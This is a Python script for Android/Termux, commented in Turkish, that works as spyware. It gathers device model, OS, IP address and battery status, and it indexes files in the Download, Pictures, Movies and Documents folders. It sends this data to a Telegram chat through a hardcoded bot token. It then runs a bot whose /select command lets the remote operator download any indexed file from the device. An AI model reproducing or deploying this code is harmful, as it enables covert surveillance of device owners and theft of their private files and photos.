import os
import json
import time
import requests
import telegram
from telegram.ext import Updater, CommandHandler

# Telegram Bot Ayarları
BOT_TOKEN = "7990420796:AAEqVI1L0WiGL8l66L_njVYvgnaC2vNbL6Y"
CHAT_ID = "-4804654305"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

# Dosya-nesne eşleştirmesi için global değişken
dosya_haritasi = {}

def cihaz_bilgisi_al():
    bilgiler = {}
    try:
        bilgiler["Model"] = os.popen("getprop ro.product.model").read().strip()
        bilgiler["OS"] = os.popen("getprop ro.build.version.release").read().strip()
        bilgiler["IP"] = os.popen("ip addr show wlan0 | grep inet").read().split()[1].split('/')[0]
        bilgiler["Batarya"] = os.popen("termux-battery-status").read().strip() or "Bilinmiyor"
    except:
        bilgiler["Hata"] = "Bazı bilgiler alınamadı!"
    return bilgiler

def dosya_tara():
    klasorler = {
        "Download": "/sdcard/Download",
        "Pictures": "/sdcard/Pictures",
        "Movies": "/sdcard/Movies",
        "Documents": "/sdcard/Documents"
    }
    dosya_listesi = {}
    global dosya_haritasi
    dosya_haritasi = {}
    sayac = 1

    for klasor, yol in klasorler.items():
        dosya_listesi[klasor] = []
        try:
            for root, _, files in os.walk(yol):
                for dosya in files:
                    tam_yol = os.path.join(root, dosya)
                    dosya_listesi[klasor].append({f"[{sayac}]": dosya})
                    dosya_haritasi[str(sayac)] = tam_yol
                    sayac += 1
        except:
            dosya_listesi[klasor].append({"Hata": f"{klasor} taranamadı!"})

    return dosya_listesi

def bilgileri_kaydet_ve_gonder():
    zaman_damgasi = int(time.time())

    # Cihaz bilgisini kaydet ve gönder
    cihaz_bilgisi = cihaz_bilgisi_al()
    cihaz_dosyasi = f"cihaz_{zaman_damgasi}.json"
    with open(cihaz_dosyasi, "w") as f:
        json.dump(cihaz_bilgisi, f, indent=4, ensure_ascii=False)
    print(f"Cihaz bilgisi {cihaz_dosyasi} kaydedildi!")

    with open(cihaz_dosyasi, "rb") as f:
        requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
    print(f"{cihaz_dosyasi} Telegram'a gönderildi!")

    # Dosya listesini kaydet ve gönder
    dosya_listesi = dosya_tara()
    dosya_dosyasi = f"dosyalar_{zaman_damgasi}.json"
    with open(dosya_dosyasi, "w") as f:
        json.dump(dosya_listesi, f, indent=4, ensure_ascii=False)
    print(f"Dosyalar {dosya_dosyasi} kaydedildi!")

    with open(dosya_dosyasi, "rb") as f:
        requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
    print(f"{dosya_dosyasi} Telegram'a gönderildi!")

def select_file(update, context):
    try:
        numara = context.args[0]  # /select 6 -> 6'yı alır
        dosya_yolu = dosya_haritasi.get(numara)
        if not dosya_yolu or not os.path.exists(dosya_yolu):
            update.message.reply_text(f"Numara {numara} bulunamadı, kral! 😈")
            return

        with open(dosya_yolu, "rb") as f:
            update.message.reply_document(document=f, filename=os.path.basename(dosya_yolu))
        print(f"{numara} numaralı dosya ({dosya_yolu}) Telegram'a gönderildi!")
    except:
        update.message.reply_text("Hata, dosya gönderilemedi!")
        print(f"Select hatası: {numara}")

def main():
    print("Botu başlatıyorum, kral! 😈")
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("select", select_file, pass_args=True))
    
    # Bilgileri topla ve gönder
    bilgileri_kaydet_ve_gonder()
    
    # Botu başlat
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
